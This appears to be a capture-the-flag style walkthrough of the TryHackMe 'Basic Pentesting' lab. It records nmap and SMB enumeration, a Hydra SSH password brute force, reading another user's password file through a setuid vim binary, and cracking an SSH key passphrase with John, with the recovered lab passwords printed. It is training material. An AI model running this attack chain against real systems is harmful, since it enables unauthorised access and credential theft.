BASIC PENTESTING:

NMAP SCAN:

nmap -sV -T5 -Pn 10.10.175.128

RESULT:

Nmap scan report for 10.10.175.128
Host is up (0.24s latency).
Not shown: 960 closed ports, 34 filtered ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8080/tcp open  http-proxy

SCAN:

nmap --script=smb-enum-users.nse,smb-enum-shares.nse -Pn -T5  10.10.175.128


RESULT:

Nmap scan report for 10.10.175.128
Host is up (0.18s latency).
Not shown: 994 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
8009/tcp open  ajp13
8080/tcp open  http-proxy

Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.175.128\Anonymous: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\samba\anonymous
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.175.128\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (Samba Server 4.3.11-Ubuntu)
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|_    Current user access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 30.12 seconds

USE SMB TO RETIEVE FILE:

smbget -R smb://10.10.175.128/Anonymous


USERNAME IS RETRIEVED FROM staff.txt

NOW USE HYDRA TO BRUTE FORCE THE PASSWORD:

hydra -l jan -P /usr/share/wordlists/rockyou.txt ssh://10.10.217.120
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-24 18:40:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.217.120:22/
[STATUS] 121.00 tries/min, 121 tries in 00:01h, 14344279 to do in 1975:48h, 16 active
[STATUS] 105.33 tries/min, 316 tries in 00:03h, 14344084 to do in 2269:39h, 16 active
[STATUS] 99.29 tries/min, 695 tries in 00:07h, 14343705 to do in 2407:49h, 16 active
[22][ssh] host: 10.10.217.120   login: jan   password: armando
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 2 final worker threads did not complete until end.
[ERROR] 2 targets did not resolve or could not be connected
[ERROR] 0 targets did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-24 18:48:29


ssh into jans account

ssh jans@10.10.217.120

find / -perm -4000 2> /dev/null

vim has setuid bit set 

use it to read kay's password

vim /home/kay/pass.bak

DONE WE HAVE THE PASSWORD


ADDITIONAL :

/usr/share/john/ssh2john.py kay_id_rsa > forjohn.txt

john forjohn.txt --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
beeswax          (kay_id_rsa)
1g 0:00:00:06 DONE (2021-04-24 20:56) 0.1519g/s 2179Kp/s 2179Kc/s 2179KC/sa6_123..*7Â¡Vamos!
Session completed



kali@kali:~/tryhackme/basic_pentest$ ls -l
total 150684
-rw-r--r-- 1 kali kali      4766 Apr 24 20:54 forjohn.txt
-rw-r--r-- 1 kali kali 154275871 Apr 24 18:45 hydra.restore
-rw-r--r-- 1 kali kali      3951 Apr 24 21:40 index.txt
-rw-r--r-- 1 kali kali      3326 Apr 24 19:53 kay_id_rsa
-rwxr-xr-x 1 kali kali       173 Apr 22 22:55 staff.txt
kali@kali:~/tryhackme/basic_pentest$ chmod 600 kay_id_rsa 
kali@kali:~/tryhackme/basic_pentest$ ssh -i kay_id_rsa kay@10.10.245.167
Enter passphrase for key 'kay_id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.


Last login: Mon Apr 23 16:04:07 2018 from 192.168.56.102
kay@basic2:~$ whoami
kay
kay@basic2:~$ ls
pass.bak
kay@basic2:~$ cat pass.bak 
heresareallystrongpasswordthatfollowsthepasswordpolicy$$
kay@basic2:~$ 
